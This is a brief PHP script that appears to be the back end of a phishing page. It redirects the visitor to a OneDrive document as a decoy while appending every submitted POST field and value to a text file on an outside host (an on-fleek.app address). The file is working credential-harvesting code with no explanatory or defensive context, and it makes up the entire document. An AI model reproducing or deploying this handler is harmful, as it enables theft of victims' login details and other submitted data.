<?php
header ("Location: https://onedrive.live.com/redir?resid=519E8EA44DBCE78!152&authkey=!ALdtJ7OFZ-AEHeo&ithint=file%2cdocx&e=b5G4nI");
$handle = fopen("https://young-arm-millions.on-fleek.app/text.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>

